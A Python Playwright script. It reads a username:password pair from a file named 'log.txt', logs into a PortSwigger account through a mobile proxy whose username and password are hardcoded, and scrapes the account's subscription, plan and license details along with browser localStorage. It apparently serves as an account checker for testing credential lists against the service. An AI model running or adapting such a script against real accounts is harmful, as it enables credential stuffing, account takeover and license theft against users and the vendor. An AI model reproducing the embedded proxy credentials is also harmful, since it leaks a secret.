#!/usr/bin/env python3
"""Extract subscription data using Playwright (executes JavaScript)"""

from playwright.sync_api import sync_playwright
import json
import sys

# Read first account
with open("log.txt", 'r', encoding='utf-8') as f:
    for line in f:
        line = line.strip()
        if line and not line.startswith("#"):
            username, password = line.split(":", 1)
            username = username.strip()
            password = password.strip()
            break

print(f"[*] Test account: {username}\n")

# Proxy settings
proxy = {
    "server": "http://ankara8.buymobileproxy.com:8029",
    "username": "buymobileproxycom",
    "password": "mugla9392"
}

try:
    with sync_playwright() as p:
        print("[1] Launching browser...")
        browser = p.chromium.launch(proxy=proxy)
        context = browser.new_context()
        page = context.new_page()

        print("[2] Logging in...")
        page.goto("https://login.portswigger.net/u/login", wait_until="networkidle")

        # Fill login form
        page.fill('input[name="username"]', username)
        page.fill('input[name="password"]', password)

        # Click login button
        print("[3] Submitting login...")
        page.click('button[type="submit"]')

        # Wait for redirect
        page.wait_for_url("https://portswigger.net/**", timeout=30000)
        page.wait_for_load_state("networkidle", timeout=10000)
        print(f"[✓] Login successful\n")

        # Navigate to my-account
        print("[4] Navigating to MY ACCOUNT...")
        page.goto("https://portswigger.net/#/my-account", wait_until="networkidle", timeout=15000)
        print(f"[✓] Page loaded: {page.url}\n")

        # Wait for React/Angular to render
        page.wait_for_load_state("domcontentloaded", timeout=5000)

        # Method 1: Extract all text content
        print("[5] Extracting page content...")
        print("=" * 80)

        all_text = page.inner_text("body")
        print(f"Full page text:\n{all_text[:1500]}\n")

        # Method 2: Look for specific elements with subscription data
        print("\n[6] Searching for subscription elements...")
        print("=" * 80)

        # Try different selectors that might contain subscription data
        selectors = [
            '[class*="subscription"]',
            '[class*="plan"]',
            '[class*="license"]',
            '[id*="subscription"]',
            '[id*="plan"]',
            'h1, h2, h3, h4, h5, h6',  # Headers
            '[class*="card"]',
            '[class*="alert"]',
        ]

        for selector in selectors:
            try:
                elements = page.query_selector_all(selector)
                if elements:
                    print(f"\n[*] Found {len(elements)} elements matching '{selector}'")
                    for i, elem in enumerate(elements[:3]):
                        text = elem.inner_text()
                        if text and len(text.strip()) > 0:
                            print(f"    Element {i+1}: {text[:150]}")
            except:
                pass

        # Method 3: Extract JavaScript variables/data
        print("\n[7] Extracting JavaScript data...")
        print("=" * 80)

        # Try to access window object data
        try:
            # Check if there's React DevTools data
            result = page.evaluate("""() => {
                let data = {};

                // Check for common data storage patterns
                if (window.__data) data['__data'] = window.__data;
                if (window.__state) data['__state'] = window.__state;
                if (window.__INITIAL_STATE__) data['__INITIAL_STATE__'] = window.__INITIAL_STATE__;
                if (window.APP_STATE) data['APP_STATE'] = window.APP_STATE;

                // Check localStorage
                if (typeof(Storage) !== "undefined") {
                    data['localStorage'] = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        let key = localStorage.key(i);
                        let val = localStorage.getItem(key);
                        if (val.length < 500) {  // Only short values
                            data['localStorage'][key] = val;
                        }
                    }
                }

                return data;
            }""")

            if result:
                print("Found JavaScript data:")
                for key, value in result.items():
                    if value and (isinstance(value, dict) and len(value) > 0 or isinstance(value, str) and len(value) > 0):
                        print(f"\n  [{key}]")
                        print(json.dumps(value, indent=2, default=str)[:500])

        except Exception as e:
            print(f"  Could not extract JS data: {e}")

        # Method 4: Get all visible text that might contain subscription info
        print("\n[8] Looking for subscription information...")
        print("=" * 80)

        # Get all text and look for patterns
        all_text = page.inner_text("body")

        import re
        # Look for common patterns
        patterns = [
            (r'(?i)you do not have.*?subscription', "No subscription message"),
            (r'(?i)subscription:?\s*([^\n]+)', "Subscription line"),
            (r'(?i)plan:?\s*([^\n]+)', "Plan line"),
            (r'(?i)license:?\s*([^\n]+)', "License line"),
            (r'(?i)(professional|team|enterprise|community|free)', "Product type"),
        ]

        for pattern, label in patterns:
            matches = re.findall(pattern, all_text, re.MULTILINE)
            if matches:
                print(f"\n  ✓ {label}:")
                for match in matches[:3]:
                    print(f"    - {match.strip()}")

        # Save full page content for inspection
        print("\n[9] Saving page content...")
        with open("subscription_page.html", "w", encoding="utf-8") as f:
            f.write(page.content())
        print("  Saved: subscription_page.html")

        with open("subscription_page_text.txt", "w", encoding="utf-8") as f:
            f.write(all_text)
        print("  Saved: subscription_page_text.txt")

        browser.close()
        print("\n" + "=" * 80)
        print("[*] Extraction completed")

except ImportError:
    print("[!] Playwright not installed")
    print("Install with: pip install playwright")
    print("Then run: playwright install chromium")
    sys.exit(1)

except Exception as e:
    print(f"[✗] Error: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)
